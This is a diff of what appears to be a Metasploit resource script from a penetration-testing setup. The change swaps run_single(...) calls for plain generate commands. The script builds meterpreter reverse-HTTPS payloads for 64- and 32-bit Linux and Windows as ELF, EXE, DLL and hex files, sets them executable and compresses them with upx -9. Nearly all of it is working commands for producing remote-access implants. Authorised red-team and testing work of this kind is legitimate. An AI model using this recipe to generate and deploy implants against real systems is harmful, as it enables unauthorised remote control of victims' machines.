@@ -11,30 +11,30 @@ setg LURI /multi
 
 use payload/linux/x64/meterpreter_reverse_https
 set PayloadUUIDName ParanoidStagedElf64
-run_single("generate -f elf -o /pentest/share/reverse.http.linux_amd64")
+generate -f elf -o /pentest/share/reverse.http.linux_amd64
 chmod 755 /pentest/share/reverse.http.linux_amd64
 upx -9 /pentest/share/reverse.http.linux_amd64
 
 use payload/linux/x86/meterpreter_reverse_https
 set PayloadUUIDName ParanoidStagedElf32
-run_single("generate -f elf -o /pentest/share/reverse.http.linux_i386")
+generate -f elf -o /pentest/share/reverse.http.linux_i386
 chmod 755 /pentest/share/reverse.http.linux_i386
 upx -9 /pentest/share/reverse.http.linux_i386
 
 # these have to be staged: https://github.com/rapid7/metasploit-framework/issues/6364
 use payload/windows/x64/meterpreter/reverse_winhttps
 set PayloadUUIDName ParanoidStagedExe64
-run_single("generate -f exe -o /pentest/share/reverse.http.windows_amd64.exe")
-run_single("generate -f hex -o /pentest/share/reverse.http.windows_amd64.hex")
-run_single("generate -f dll -o /pentest/share/reverse.http.windows_amd64.dll")
+generate -f exe -o /pentest/share/reverse.http.windows_amd64.exe
+generate -f hex -o /pentest/share/reverse.http.windows_amd64.hex
+generate -f dll -o /pentest/share/reverse.http.windows_amd64.dll
 upx -9 /pentest/share/reverse.http.windows_amd64.exe
 upx -9 /pentest/share/reverse.http.windows_amd64.dll
 
 use payload/windows/meterpreter/reverse_winhttps
 set PayloadUUIDName ParanoidStagedExe32
-run_single("generate -f exe -o /pentest/share/reverse.http.windows_i386.exe")
-run_single("generate -f hex -o /pentest/share/reverse.http.windows_i386.hex")
-run_single("generate -f dll -o /pentest/share/reverse.http.windows_i386.dll")
+generate -f exe -o /pentest/share/reverse.http.windows_i386.exe
+generate -f hex -o /pentest/share/reverse.http.windows_i386.hex
+generate -f dll -o /pentest/share/reverse.http.windows_i386.dll
 upx -9 /pentest/share/reverse.http.windows_i386.exe
 upx -9 /pentest/share/reverse.http.windows_i386.dll
 
